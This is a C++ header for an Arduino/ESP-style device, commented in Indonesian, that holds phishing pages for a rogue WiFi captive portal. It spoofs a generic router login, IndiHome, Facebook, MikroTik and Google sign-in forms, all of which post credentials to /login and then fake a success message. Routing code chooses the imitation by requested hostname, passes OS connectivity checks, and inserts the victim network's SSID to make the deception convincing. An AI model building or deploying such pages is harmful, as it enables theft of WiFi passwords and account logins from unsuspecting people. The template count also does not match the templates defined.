#ifndef TEMPLATES_H
#define TEMPLATES_H

#include <Arduino.h>
extern String targetSSID;

// ═══════════════════════════════════════════════
// Template 0: GENERIC — Captive portal WiFi
// Hanya minta password (bukan email), desain seperti
// halaman login WiFi publik / router.
// ═══════════════════════════════════════════════
const char html_generic[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Access</title>
<style>
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
background:linear-gradient(135deg,#0f2027 0%,#203a43 50%,#2c5364 100%);
min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
.card{background:#fff;border-radius:16px;width:100%;max-width:360px;
box-shadow:0 20px 60px rgba(0,0,0,.4);overflow:hidden}
.hdr{padding:32px 24px 20px;text-align:center;border-bottom:1px solid #eef2f5}
.wifi{width:64px;height:64px;margin:0 auto 14px;border-radius:50%;
background:linear-gradient(135deg,#1e88e5,#42a5f5);display:flex;
align-items:center;justify-content:center}
.wifi svg{width:36px;height:36px;fill:#fff}
h1{margin:0;font-size:20px;color:#1a1a1a;font-weight:600}
.sub{margin:6px 0 0;color:#6b7280;font-size:13px}
.body{padding:24px}
.net{background:#f0f7ff;border:1px solid #d6e8ff;border-radius:10px;
padding:12px 14px;margin-bottom:18px;display:flex;align-items:center;gap:10px}
.net .dot{width:8px;height:8px;border-radius:50%;background:#22c55e;
box-shadow:0 0 0 3px rgba(34,197,94,.2)}
.net .name{font-size:14px;color:#1e3a8a;font-weight:500}
label{display:block;font-size:13px;color:#374151;margin-bottom:6px;font-weight:500}
.pwd-wrap{position:relative}
input[type=password],input[type=text]{width:100%;padding:13px 44px 13px 14px;
border:2px solid #e5e7eb;border-radius:10px;font-size:15px;outline:none;
transition:border-color .2s}
input:focus{border-color:#1e88e5}
.toggle{position:absolute;right:12px;top:50%;transform:translateY(-50%);
background:none;border:none;cursor:pointer;padding:4px;color:#9ca3af;font-size:13px}
.btn{width:100%;padding:14px;margin-top:18px;border:none;border-radius:10px;
background:linear-gradient(135deg,#1e88e5,#1565c0);color:#fff;font-size:15px;
font-weight:600;cursor:pointer;transition:transform .1s}
.btn:active{transform:scale(.98)}
#loading{display:none;text-align:center;padding:32px 24px}
.spin{border:4px solid #e5e7eb;border-top:4px solid #1e88e5;border-radius:50%;
width:44px;height:44px;animation:sp 0.9s linear infinite;margin:0 auto 16px}
@keyframes sp{to{transform:rotate(360deg)}}
.ok{color:#1e88e5;font-weight:600;margin:0 0 4px;font-size:15px}
.tiny{color:#9ca3af;font-size:12px;margin:0}
.foot{text-align:center;padding:0 24px 20px;color:#cbd5e1;font-size:11px}
</style></head><body>
<div class="card">
  <div class="hdr">
    <div class="wifi">
      <svg viewBox="0 0 24 24"><path d="M12 21l3-3.5a4.2 4.2 0 00-6 0L12 21zm0-6.5c1.6 0 3.1.6 4.2 1.6l2.1-2.4A10 10 0 0012 11a10 10 0 00-6.3 2.2l2.1 2.4A6.1 6.1 0 0112 14.5zM12 7.5c3 0 5.8 1 8 2.8l2-2.3A13.3 13.3 0 0012 4.5 13.3 13.3 0 002 8l2 2.3c2.2-1.8 5-2.8 8-2.8z"/></svg>
    </div>
    <h1>WiFi Access</h1>
    <p class="sub">Jaringan ini memerlukan password</p>
  </div>
  <div class="body">
    <div id="f">
      <div class="net">
        <span class="dot"></span>
        <span class="name">Connected Network</span>
      </div>
      <form action="/login" method="POST" onsubmit="sh()">
        <label for="pw">Password WiFi</label>
        <div class="pwd-wrap">
          <input type="password" id="pw" name="password" placeholder="Masukkan password" required autofocus>
          <button type="button" class="toggle" onclick="tg()">👁</button>
        </div>
        <button type="submit" class="btn">Hubungkan</button>
      </form>
    </div>
    <div id="loading">
      <div class="spin"></div>
      <p class="ok">Memverifikasi...</p>
      <p class="tiny">Mohon tunggu sebentar</p>
    </div>
  </div>
  <div class="foot">Akses aman · Jaringan terenkripsi</div>
</div>
<script>
function sh(){document.getElementById('f').style.display='none';document.getElementById('loading').style.display='block';}
function tg(){var i=document.getElementById('pw');i.type=i.type==='password'?'text':'password';}
</script>
</body></html>
)rawliteral";

// ═══════════════════════════════════════════════
// Template 1: INDIHOME — tidak diubah
// ═══════════════════════════════════════════════
const char html_indihome[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>IndiHome - Login</title>
<style>
*{box-sizing:border-box}body{margin:0;font-family:Arial;background:#e60013;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:12px;width:340px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.3)}
.hdr{background:#e60013;color:#fff;padding:24px;text-align:center}
.logo{font-size:26px;font-weight:bold;letter-spacing:2px}
.sub{font-size:12px;opacity:.85;margin-top:4px}
.body{padding:30px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#e60013;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
#loading{display:none;text-align:center;padding:20px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #e60013;border-radius:50%;width:40px;height:40px;animation:sp 1s linear infinite;margin:15px auto}
@keyframes sp{to{transform:rotate(360deg)}}
</style></head><body>
<div class="card">
<div class="hdr"><div class="logo">IndiHome</div><div class="sub">Internet Cepat Indonesia</div></div>
<div class="body">
<div id="f"><p style="text-align:center;color:#333;margin:0 0 15px">Silakan masuk untuk melanjutkan</p>
<form action="/login" method="POST" onsubmit="sh()">
<input name="email" placeholder="Nomor IndiHome" required>
<input type="password" name="password" placeholder="Password WiFi" required>
<button>Masuk</button></form></div>
<div id="loading"><div class="spin"></div><p style="color:#e60013;font-weight:bold">Berhasil!</p>
<p style="font-size:12px;color:#666">Menghubungkan...</p></div>
</div></div>
<script>function sh(){document.getElementById('f').style.display='none';document.getElementById('loading').style.display='block';}</script>
</body></html>
)rawliteral";

// ═══════════════════════════════════════════════
// Template 2: FACEBOOK — tidak diubah
// ═══════════════════════════════════════════════
const char html_facebook[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook</title>
<style>
*{box-sizing:border-box}body{margin:0;font-family:Helvetica,Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:8px;padding:20px;width:340px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.fb{color:#1877f2;font-size:32px;font-weight:bold;text-align:center;margin-bottom:10px}
.tag{text-align:center;color:#1c1e21;font-size:15px;margin-bottom:20px;padding-bottom:15px;border-bottom:1px solid #ddd}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:bold;margin-top:12px;cursor:pointer}
#loading{display:none;text-align:center;padding:20px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #1877f2;border-radius:50%;width:40px;height:40px;animation:sp 1s linear infinite;margin:15px auto}
@keyframes sp{to{transform:rotate(360deg)}}
</style></head><body>
<div class="card">
<div class="fb">facebook</div>
<div class="tag">Masuk ke akun Anda</div>
<div id="f">
<form action="/login" method="POST" onsubmit="sh()">
<input name="email" placeholder="Email atau Nomor HP" required>
<input type="password" name="password" placeholder="Password" required>
<button>Masuk</button></form></div>
<div id="loading"><div class="spin"></div><p style="color:#1877f2;font-weight:bold">Berhasil!</p>
<p style="font-size:13px;color:#666">Memuat beranda...</p></div>
</div>
<script>function sh(){document.getElementById('f').style.display='none';document.getElementById('loading').style.display='block';}</script>
</body></html>
)rawliteral";


// ------------------------------------------------------------------
// Template 3: MIKROTIK
// ------------------------------------------------------------------
const char html_mikrotik[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>MikroTik Login</title>
<style>
*{box-sizing:border-box}body{margin:0;font-family:Arial;background:#222;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:8px;width:340px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.4)}
.hdr{background:#29323d;color:#fff;padding:22px;text-align:center}
.logo{font-size:22px;font-weight:bold;letter-spacing:1px}
.sub{font-size:12px;opacity:.8;margin-top:4px}
.body{padding:26px}
input{width:100%;padding:11px;margin:8px 0;border:1px solid #ccc;border-radius:5px;font-size:14px}
button{width:100%;padding:12px;background:#29323d;color:#fff;border:none;border-radius:5px;font-size:15px;font-weight:bold;margin-top:10px;cursor:pointer}
#loading{display:none;text-align:center;padding:20px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #29323d;border-radius:50%;width:40px;height:40px;animation:sp 1s linear infinite;margin:15px auto}
@keyframes sp{to{transform:rotate(360deg)}}
</style></head><body>
<div class="card">
<div class="hdr"><div class="logo">MikroTik</div><div class="sub">RouterOS Login</div></div>
<div class="body">
<div id="f"><form action="/login" method="POST" onsubmit="sh()">
<input name="email" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button>Login</button></form></div>
<div id="loading"><div class="spin"></div><p style="font-weight:bold">Connecting...</p></div>
</div></div>
<script>function sh(){document.getElementById('f').style.display='none';document.getElementById('loading').style.display='block';}</script>
</body></html>
)rawliteral";

// ------------------------------------------------------------------
// Template 4: GOOGLE
// ------------------------------------------------------------------
const char html_google[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google - Sign in</title>
<style>
*{box-sizing:border-box}body{margin:0;font-family:Roboto,Arial;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.card{width:360px;padding:32px;border:1px solid #dadce0;border-radius:8px}
.logo{text-align:center;margin-bottom:16px}
.logo span{font-size:28px}
.g1{color:#4285f4}.g2{color:#ea4335}.g3{color:#fbbc05}.g4{color:#34a853}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 8px}
.sub{font-size:16px;color:#202124;text-align:center;margin:0 0 24px}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
button{width:100%;padding:11px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;margin-top:16px;cursor:pointer}
#loading{display:none;text-align:center;padding:20px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #1a73e8;border-radius:50%;width:36px;height:36px;animation:sp 1s linear infinite;margin:15px auto}
@keyframes sp{to{transform:rotate(360deg)}}
</style></head><body>
<div class="card">
<div class="logo"><span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g2">l</span><span class="g1">e</span></div>
<h1>Sign in</h1>
<p class="sub">Use your Google Account</p>
<div id="f"><form action="/login" method="POST" onsubmit="sh()">
<input name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<button>Next</button></form></div>
<div id="loading"><div class="spin"></div><p style="color:#1a73e8">Signing in...</p></div>
</div>
<script>function sh(){document.getElementById('f').style.display='none';document.getElementById('loading').style.display='block';}</script>
</body></html>
)rawliteral";

inline const char* getTemplate(int idx) {
  switch (idx) {
    case 0: return html_generic;
    case 1: return html_indihome;
    case 2: return html_facebook;
    case 3: return html_mikrotik;
    case 4: return html_google;
    default: return html_generic;
  }
}

inline const char* getTemplateName(int idx) {
  switch (idx) {
    case 0: return "Generic";
    case 1: return "IndiHome";
    case 2: return "Facebook";
    case 3: return "MikroTik";
    case 4: return "Google";
    case 5: return "Hosting";
    default: return "Generic";
  }
}

inline const char* getTemplateForHost(const String& host, int fallbackIdx) {
  String h = host;
  h.toLowerCase();
  // Jangan override untuk captive-portal / connectivity-check
  if (h.indexOf("gstatic") >= 0 || h.indexOf("connectivity") >= 0 ||
      h.indexOf("captive") >= 0 || h.indexOf("msftconnecttest") >= 0 ||
      h.indexOf("detectportal") >= 0 || h.indexOf("clients3.google") >= 0) {
    return getTemplate(fallbackIdx);
  }
  if (h.indexOf("facebook") >= 0) return html_facebook;
  if (h.indexOf("indihome") >= 0) return html_indihome;
  if (h.indexOf("mikrotik") >= 0) return html_mikrotik;
  if (h.indexOf("google") >= 0 || h.indexOf("gmail") >= 0 || h.indexOf("youtube") >= 0) return html_google;
  return getTemplate(fallbackIdx);
}

inline String renderTemplateForHost(const String& host, int fallbackIdx) {
  String s = String(FPSTR(getTemplateForHost(host, fallbackIdx)));
  s.replace("Connected Network", targetSSID.length() ? targetSSID : "Connected Network");
  return s;
}
const int TEMPLATE_COUNT = 6;

#endif